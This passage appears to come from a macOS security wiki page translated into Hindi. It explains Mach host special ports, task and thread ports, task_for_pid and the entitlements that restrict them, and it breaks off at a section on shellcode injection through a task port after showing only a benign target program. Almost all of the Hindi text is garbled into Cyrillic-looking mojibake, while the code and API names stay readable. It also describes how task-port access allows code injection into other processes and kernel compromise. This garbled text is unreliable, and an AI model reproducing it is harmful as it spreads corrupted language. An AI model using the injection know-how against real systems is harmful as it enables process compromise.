рдпреЗ 2 рд╕рдореВрд╣реЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рд╣реИрдВ: **рдкрд╣рд▓реЗ 7 рдмрдВрджрд░рдЧрд╛рд╣ рдХрд░реНрдиреЗрд▓ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реИрдВ** рдЬрд┐рд╕рдореЗрдВ 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` рдФрд░ 7 `HOST_MAX_SPECIAL_KERNEL_PORT` рд╣реИред\
**8 рд╕реЗ** рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╡реЗ **рд╕рд┐рд╕реНрдЯрдо рдбреЗрдордиреНрд╕ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реИрдВ** рдФрд░ рдЙрдиреНрд╣реЗрдВ [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* **рдореЗрдЬрдмрд╛рди рдмрдВрджрд░рдЧрд╛рд╣**: рдпрджрд┐ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ рдЗрд╕ рдмрдВрджрд░рдЧрд╛рд╣ рдкрд░ **SEND** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ рддреЛ рд╡рд╣ рдЗрд╕рдХреЗ рд░реВрдЯреАрди рдХреЛ рдмреБрд▓рд╛рдХрд░ **рд╕рд┐рд╕реНрдЯрдо** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдЬрд╛рдирдХрд╛рд░реА** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреИрд╕реЗ:
* `host_processor_info`: рдкреНрд░реЛрд╕реЗрд╕рд░ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `host_info`: рдореЗрдЬрдмрд╛рди рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `host_virtual_physical_table_info`: рд╡рд░реНрдЪреБрдЕрд▓/рдлрд┐рдЬрд┐рдХрд▓ рдкреЗрдЬ рдЯреЗрдмрд▓ (MACH\_VMDEBUG рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)
* `host_statistics`: рдореЗрдЬрдмрд╛рди рд╕рд╛рдВрдЦреНрдпрд┐рдХреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `mach_memory_info`: рдХрд░реНрдиреЗрд▓ рдореЗрдореЛрд░реА рд▓реЗрдЖрдЙрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рдореЗрдЬрдмрд╛рди рдирд┐рдЬреА рдмрдВрджрд░рдЧрд╛рд╣**: рдЗрд╕ рдмрдВрджрд░рдЧрд╛рд╣ рдкрд░ **SEND** рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рд╡рд┐рд╢реЗрд╖ рдПрдХреНрд╢рди** рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреИрд╕реЗ рдмреВрдЯ рдбреЗрдЯрд╛ рджрд┐рдЦрд╛рдирд╛ рдпрд╛ рдХрд░реНрдиреЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛ред **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **`kext_request`** API рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп entitlements **`com.apple.private.kext*`** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ Apple binaries рдХреЛ рджреА рдЬрд╛рддреА рд╣реИрдВред
* рдЕрдиреНрдп рд░реВрдЯреАрди рдЬреЛ рдмреБрд▓рд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
* `host_get_boot_info`: `machine_boot_info()` рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `host_priv_statistics`: рд╡рд┐рд╢реЗрд╖ рдЖрдВрдХрдбрд╝реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `vm_allocate_cpm`: рдПрдХрд╕рдВрдШрдЯрд┐рдд рдлрд┐рдЬрд┐рдХрд▓ рдореЗрдореЛрд░реА рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ
* `host_processors`: рдореЗрдЬрдмрд╛рди рдкреНрд░реЛрд╕реЗрд╕рд░реНрд╕ рдХреЛ рднреЗрдЬреЗрдВ
* `mach_vm_wire`: рдореЗрдореЛрд░реА рдХреЛ рд░рд╣рдиреЗ рд╡рд╛рд▓рд╛ рдмрдирд╛рдПрдВ
* рдХреНрдпреЛрдВрдХрд┐ **рд░реВрдЯ** рдЗрд╕ рдЕрдиреБрдорддрд┐ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ `host_set_[special/exception]_port[s]` рдХреЛ рдмреБрд▓рд╛рдХрд░ **рдореЗрдЬрдмрд╛рди рд╡рд┐рд╢реЗрд╖ рдпрд╛ рдЕрд╡рд╢реЗрд╖ рдмрдВрджрд░рдЧрд╛рд╣реЛрдВ рдХреЛ рдЙрдбрд╝рд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдЗрди рд╕рднреА рдореЗрдЬрдмрд╛рди рд╡рд┐рд╢реЗрд╖ рдмрдВрджрд░рдЧрд╛рд╣реЛрдВ рдХреЛ рджреЗрдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИ рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдХрд░:
```bash
procexp all ports | grep "HSP"
```
### рдХрд╛рд░реНрдп рд╡рд┐рд╢реЗрд╖ рдкреЛрд░реНрдЯ

рдпреЗ рдкреЛрд░реНрдЯ рд╡рд┐рд╢реЗрд╖ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЖрд░рдХреНрд╖рд┐рдд рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ `task_[get/set]_special_port` рдХреЛ рдмреБрд▓рд╛рдХрд░ рдкреНрд░рд╛рдкреНрдд/рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрдиреНрд╣реЗрдВ `task_special_ports.h` рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
[рдпрд╣рд╛рдБ](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[task-self send right]: рдЗрд╕ рдЯрд╛рд╕реНрдХ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рдкреЛрд░реНрдЯред рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрддрд╛ рд╣реИ рдореИрд╕реЗрдЬ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЛ рдЯрд╛рд╕реНрдХ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рдкреЛрд░реНрдЯ **mach\_task\_self (рдиреАрдЪреЗ рджреЗрдЦреЗрдВ Task Ports)** рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: рдЯрд╛рд╕реНрдХ рдХрд╛ bootstrap рдкреЛрд░реНрдЯред рдЕрдиреНрдп рд╕рд┐рд╕реНрдЯрдо рд╕реЗрд╡рд╛ рдкреЛрд░реНрдЯ рдХреА рд╡рд╛рдкрд╕реА рдХреЗ рд▓рд┐рдП рдореИрд╕реЗрдЬ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрддрд╛ рд╣реИред
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рдкреЛрд░реНрдЯ рдЬреЛ рдЖрд╡рдВрдЯрд┐рдд рд╣реЛрд╕реНрдЯ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдкреЛрд░реНрдЯ **mach\_host\_self** рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: рдЗрд╕ рдЯрд╛рд╕реНрдХ рджреНрд╡рд╛рд░рд╛ рдЕрдкрдиреА wired рдХрд░реНрдиреЗрд▓ рдореЗрдореЛрд░реА рд▓реЗрдиреЗ рдХреЗ рд╕реНрд░реЛрдд рдХрд╛ рдирд╛рдордХрд░рдг рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреЛрд░реНрдЯред
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: рдЗрд╕ рдЯрд╛рд╕реНрдХ рджреНрд╡рд╛рд░рд╛ рдЕрдкрдиреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдореЗрдореЛрд░реА рдореИрдиреЗрдЬреНрдб рдореЗрдореЛрд░реА рд▓реЗрдиреЗ рдХреЗ рд╕реНрд░реЛрдд рдХрд╛ рдирд╛рдордХрд░рдг рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреЛрд░реНрдЯред

### Task Ports

рдореВрд▓ рд░реВрдк рд╕реЗ Mach рдореЗрдВ "рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ" рдирд╣реАрдВ рдереАрдВ, рдмрд▓реНрдХрд┐ "рдЯрд╛рд╕реНрдХ" рдереАрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдзрд╛рдЧреЛрдВ рдХрд╛ рдПрдХ рдбрд┐рдмреНрдмрд╛ рдорд╛рдирд╛ рдЧрдпрд╛ рдерд╛ред рдЬрдм Mach рдХреЛ BSD рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдпрд╛ рдЧрдпрд╛ рддреЛ **рдкреНрд░рддреНрдпреЗрдХ рдЯрд╛рд╕реНрдХ рдХреЛ рдПрдХ BSD рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдорд╛рдирд╛ рдЧрдпрд╛**ред рдЗрд╕рд▓рд┐рдП рд╣рд░ BSD рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ рдЙрд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╡рд┐рд╡рд░рдг рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рд╣рд░ Mach рдЯрд╛рд╕реНрдХ рдХреЗ рднреА рдЕрдкрдиреЗ рдЖрдВрддрд░рд┐рдХ рдХрд╛рдо рд╣реЛрддреЗ рд╣реИрдВ (рдХреЗрд╡рд▓ рдЕрд╕реНрддрд┐рддреНрд╡ рдирд╣реАрдВ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ pid 0 рдХреЗ рд▓рд┐рдП рдЬреЛ `kernel_task` рд╣реИред)

рдЗрд╕рдХреЗ рд╕рд╛рде рджреЛ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рдВрдХреНрд╢рди рд╣реИрдВ:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: рдирд┐рд░реНрджрд┐рд╖реНрдЯ `pid` рджреНрд╡рд╛рд░рд╛ рд╕рдВрдмрдВрдзрд┐рдд рдЯрд╛рд╕реНрдХ рдХреЗ рд▓рд┐рдП рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ SEND рд░рд╛рдЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ `target_task_port` рдХреЛ рджреЗрдВ (рдЬреЛ рд╕рд╛рдорд╛рдиреНрдпрдд: рдХреЙрд▓рд░ рдЯрд╛рд╕реНрдХ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдиреЗ `mach_task_self()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ рдЕрд▓рдЧ рдЯрд╛рд╕реНрдХ рдкрд░ рдПрдХ SEND рдкреЛрд░реНрдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред)
* `pid_for_task(task, &pid)`: рдПрдХ рдЯрд╛рд╕реНрдХ рдХреЗ рд▓рд┐рдП рдПрдХ SEND рд░рд╛рдЗрдЯ рдХреЗ рджреНрд╡рд╛рд░рд╛ рджрд┐рдпрд╛ рдЧрдпрд╛, рдЗрд╕ рдЯрд╛рд╕реНрдХ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд PID рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВред

рдЯрд╛рд╕реНрдХ рдХреЗ рднреАрддрд░ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЯрд╛рд╕реНрдХ рдХреЛ рдЕрдкрдиреЗ рдЖрдк рдХреЗ рд▓рд┐рдП `SEND` рд░рд╛рдЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА рдЬреЛ `mach_task_self()` рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛рддреА рдереА (рдЬреЛ `task_self_trap` (28) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ)ред рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рдЯрд╛рд╕реНрдХ рдХрдИ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ:

* `task_threads`: рдЯрд╛рд╕реНрдХ рдХреЗ рдзрд╛рдЧреЛрдВ рдХреЗ рд╕рднреА рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдкрд░ SEND рд░рд╛рдЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `task_info`: рдЯрд╛рд╕реНрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `task_suspend/resume`: рдЯрд╛рд╕реНрдХ рдХреЛ рд░реЛрдХреЗрдВ рдпрд╛ рдлрд┐рд░ рдлрд┐рд░ рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВ
* `task_[get/set]_special_port`
* `thread_create`: рдПрдХ рдзрд╛рдЧрд╛ рдмрдирд╛рдПрдВ
* `task_[get/set]_state`: рдЯрд╛рд╕реНрдХ рд╕реНрдерд┐рддрд┐ рдирд┐рдпрдВрддреНрд░рдг рдХрд░реЗрдВ
* рдФрд░ рдЕрдзрд┐рдХ [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) рдореЗрдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ **рдЕрд▓рдЧ рдЯрд╛рд╕реНрдХ** рдХреЗ рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдкрд░ рдПрдХ SEND рд░рд╛рдЗрдЯ рдХреЗ рд╕рд╛рде, рдПрдХ рдЕрд▓рдЧ рдЯрд╛рд╕реНрдХ рдкрд░ рдРрд╕реА рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
{% endhint %}

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЯрд╛рд╕реНрдХ\_рдкреЛрд░реНрдЯ рднреА **`vm_map`** рдкреЛрд░реНрдЯ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдПрдХ рдЯрд╛рд╕реНрдХ рдХреЗ рднреАрддрд░ рдореЗрдореЛрд░реА рдкрдврд╝рдиреЗ рдФрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ `vm_read()` рдФрд░ `vm_write()` рдХреЗ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рдеред рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдпрд╣ рдЕрд░реНрде рд╣реИ рдХрд┐ рдПрдХ рдЯрд╛рд╕реНрдХ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдПрдХ рдЕрд▓рдЧ рдЯрд╛рд╕реНрдХ рдХреЗ рдЯрд╛рд╕реНрдХ_рдкреЛрд░реНрдЯ рдкрд░ SEND рд░рд╛рдЗрдЯ рд╣реИ, рдЙрд╕ рдЯрд╛рд╕реНрдХ рдореЗрдВ рдХреЛрдб **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдХреНрдпреЛрдВрдХрд┐ **рдХрд░реНрдиреЗрд▓ рднреА рдПрдХ рдЯрд╛рд╕реНрдХ рд╣реИ**, рдЕрдЧрд░ рдХреЛрдИ **SEND рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрддрд╛ рд╣реИ **`kernel_task`** рдкрд░, рддреЛ рд╡рд╣ рдХрд░реНрдиреЗрд▓ рдХреЛ рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреА (рдЬреЗрд▓рдмреНрд░реЗрдХреНрд╕).

* рдЗрд╕ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП **рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП `mach_task_self()` рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВред рдпрд╣ рдкреЛрд░реНрдЯ рдХреЗрд╡рд▓ **`exec()`** рдХреЗ рдЕрд╡рд╕рд░ рдкрд░ **рд╡рд┐рд░рд╛рд╕рдд** рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ; `fork()` рдХреЗ рд╕рд╛рде рдирдИ рдЯрд╛рд╕реНрдХ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ (рдПрдХ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓реЗ рдХреЗ рд░реВрдк рдореЗрдВ, рдПрдХ рдЯрд╛рд╕реНрдХ рдХреЛ `exec()` рдХреЗ рдмрд╛рдж рднреА рдПрдХ рдирдпрд╛ рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдорд┐рд▓рддрд╛ рд╣реИред) рдЯрд╛рд╕реНрдХ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдФрд░ рдЗрд╕рдХрд╛ рдкреЛрд░реНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ `fork()` рдХрд░рддреЗ рд╕рдордп ["рдкреЛрд░реНрдЯ рд╕реНрд╡реИрдк рдиреГрддреНрдп"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) рдХрд░рдирд╛ рд╣реИред
* рдЗрд╕ рдкреЛрд░реНрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдкреНрд░рддрд┐рдмрдВрдзрд╛рдПрдБ (рдмрд╛рдЗрдирд░реА `AppleMobileFileIntegrity` рд╕реЗ `macos_task_policy` рд╕реЗ):
* рдпрджрд┐ рдРрдк рдХреЗ рдкрд╛рд╕ **`com.apple.security.get-task-allow` entitlement** рд╣реИ рддреЛ **рдПрдХ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреА рд╣реИрдВ** (рдбреАрдмрдЧрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП Xcode рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдорд╛рдиреНрдпрдд: рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ)ред **рдиреЛрдЯрд░рд╛рдЗрдЬрд╝реЗрд╢рди** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрд╕реЗ рдЙрддреНрдкрд╛рджрди рд░рд┐рд▓реАрдЬрд╝ рдХреЛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдЧреАред
* **`com.apple.system-task-ports`** entitlement рд╡рд╛рд▓реЗ рдРрдкреНрд╕ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП **рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдХреЗрд╡рд▓ рдХрд░реНрдиреЗрд▓ рдХреЛ рдирд╣реАрдВред рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЗрд╕реЗ **`task_for_pid-allow`** рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛ред рдпрд╣ рдХреЗрд╡рд▓ Apple рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд░реВрдЯ рдРрдкреНрд╕** рдПрдХ **рд╣рд╛рд░реНрдбрдиреНрдб** рд░рдирдЯрд╛рдЗрдо рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓ рдирд╣реАрдВ рдХреА рдЧрдИ рдРрдкреНрд╕ рдХреЗ **рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ** (рдФрд░ рди рдХреЗрд╡рд▓ Apple рд╕реЗ).

**рдЯрд╛рд╕реНрдХ рдирд╛рдо рдкреЛрд░реНрдЯ:** _рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ_ рдХрд╛ рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧреА рд╕рдВрд╕реНрдХрд░рдгред рдпрд╣ рдЯрд╛рд╕реНрдХ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ред рдЗрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рдПрдХрдорд╛рддреНрд░ рдЪреАрдЬ `task_info()` рд▓рдЧрддреА рд╣реИред

### Thread Ports

рдзрд╛рдЧреЛрдВ рдХреЗ рд╕рд╛рде рднреА рд╕рдВрдмрдВрдзрд┐рдд рдкреЛрд░реНрдЯ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ рдЯрд╛рд╕реНрдХ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ **`task_threads`** рдФрд░ рдкреНрд░реЛрд╕реЗрд╕рд░ рдХреЗ рд╕рд╛рде `processor_set_threads` рд╕реЗ рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВред рдзрд╛рдЧреЗ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ SEND рд░рд╛рдЗрдЯ рдереНрд░реЗрдб рдПрдХреНрдЯ рдЙрдкрдкреНрд░рдгрд╛рд▓реА рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреИрд╕реЗ:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

рдХрд┐рд╕реА рднреА рдзрд╛рдЧреЗ рдХреЛ рдЗрд╕ рдкреЛрд░реНрдЯ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`mach_thread_sef`** рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рдзрд╛рдЧреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╢реЗрд▓рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рдПрдХ рд╢реЗрд▓рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

## рдЕрдзрд┐рдХрд╛рд░ (entitlements).plist

